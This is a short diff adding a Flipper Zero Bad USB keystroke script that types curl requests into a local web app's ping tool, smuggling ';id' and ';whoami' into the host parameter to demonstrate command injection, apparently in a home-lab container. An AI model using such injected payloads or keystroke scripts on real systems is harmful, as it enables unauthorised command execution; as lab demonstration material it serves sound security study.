@@ -1,0 +1,10 @@
+REM Flipper Zero Bad USB — command injection via ping tool
+REM Exploits /tools/ping to run 'id' and 'whoami' inside the container.
+REM Nothing touches the host Pi.
+
+DELAY 1000
+STRING curl -s "http://localhost:5000/tools/ping?host=127.0.0.1;id"
+ENTER
+DELAY 500
+STRING curl -s "http://localhost:5000/tools/ping?host=127.0.0.1;whoami"
+ENTER
